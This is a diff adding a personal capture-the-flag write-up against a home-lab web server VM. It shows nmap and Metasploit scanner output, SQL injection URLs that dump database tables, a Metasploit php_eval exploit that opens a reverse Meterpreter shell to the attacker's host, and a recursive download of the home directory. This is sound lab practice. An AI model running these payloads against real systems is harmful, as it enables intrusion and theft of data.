@@ -1,0 +1,108 @@
+To find webserver address:
+
+Firstly, make sure the VM is set to bridged mode - no good if it's not :D
+
+Then:
+
+$ sudo nmap -A 192.168.1.*
+
+Looked for Ubuntu Server that was not known to be one of the computers on the network (I did this on my local router in my apartment, so basically any computer that was running Ubuntu that was not one of my roommates')
+
+For me, it is 192.136.1.104
+
+Can also do this via metaspoint web ui - has a host scan button.
+
+A third way I thought about doing this relied upon the fact that I knew my router's password.  I can just access the router configuration page, and look for the host in the list of connected hosts.
+
+
+
+
+192.168.1.104:80:
+
+auxiliary/scanner/http/dir_scanner
+[*] Using code '404' as not found for 192.168.1.104
+[*] Found http://192.168.1.104:80/cgi-bin/ 403 (192.168.1.104)
+[*] Found http://192.168.1.104:80/doc/ 403 (192.168.1.104)
+[*] Found http://192.168.1.104:80/icons/ 200 (192.168.1.104)
+[*] Found http://192.168.1.104:80/index/ 200 (192.168.1.104)
+
+auxilary/scanner/http/files_dir
+[*] Using code '404' as not found for files with extension .null
+[*] Using code '404' as not found for files with extension .backup
+[*] Using code '404' as not found for files with extension .bak
+[*] Using code '404' as not found for files with extension .c
+[*] Using code '404' as not found for files with extension .cfg
+[*] Using code '404' as not found for files with extension .class
+[*] Using code '404' as not found for files with extension .copy
+[*] Using code '404' as not found for files with extension .conf
+[*] Using code '404' as not found for files with extension .exe
+[*] Using code '404' as not found for files with extension .html
+[*] Using code '404' as not found for files with extension .htm
+[*] Using code '404' as not found for files with extension .ini
+[*] Using code '404' as not found for files with extension .log
+[*] Using code '404' as not found for files with extension .old
+[*] Using code '404' as not found for files with extension .orig
+[*] Using code '404' as not found for files with extension .php
+[*] Found http://192.168.1.104:80/index.php 200
+[*] Using code '404' as not found for files with extension .tar
+[*] Using code '404' as not found for files with extension .tar.gz
+[*] Using code '404' as not found for files with extension .tgz
+[*] Using code '404' as not found for files with extension .tmp
+[*] Using code '404' as not found for files with extension .temp
+[*] Using code '404' as not found for files with extension .txt
+[*] Using code '404' as not found for files with extension .zip
+[*] Using code '404' as not found for files with extension ~
+[*] Using code '404' as not found for files with extension 
+[*] Found http://192.168.1.104:80/index 200
+[*] Found http://192.168.1.104:80/menu 200
+[*] Using code '404' as not found for files with extension 
+[*] Found http://192.168.1.104:80/index 200
+[*] Found http://192.168.1.104:80/menu 200
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+"post" clearly can be HTML, since you can embed youtube links
+
+
+Found that post id field of URL is suseptablo to sql injection.
+
+Visited 'http://192.168.1.104/index.php?id=%2010%20UNION%20SELECT%201,GROUP_CONCAT%28table_name%29,3,4,5%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA=database%28%29;--' to get a list of tables - found 2 tables
+posts and replies
+
+By visiting 'http://192.168.1.104/index.php?id=%2010%20UNION%20SELECT%20*%20from%20posts;%20--'
+I was able to find a hidden post, with the flag 'Monkees'
+
+IP address of CTF server changed from 192.168.1.104 to 192.168.1.106
+
+GET SHELL
+
+use exploit/unix/webapp/php_eval 
+setg RHOST 192.168.1.106
+setg LHOST 192.168.1.122
+set payload php/meterpreter/reverse_tcp
+set URIPATH /index.php?id=!CODE!
+exploit
+
+found FLAG.txt in /
+
+
+called
+download -r home  ctf_comp/home
+to get a copy of the home dir
+then, on my local machine, grepped it for the term "FLAG"
+
+/home/defcon/www/index.php:		// FLAG: The first chorus line
+
+Found another reference to FLAG in /home//defcon/www/frogger/draw.js
+By searching through the code, found that the FLAG is assigned ot "Davy Jones"
+
+called "shell" to get shell and called:
+"grep -RIs "FLAG:" /
+to find all remaining flags
+Didn't have time to let it finish, but that in combination with a call like
+find -r / FLAG.txt
+should find any other flags not found by grep
+
+
+
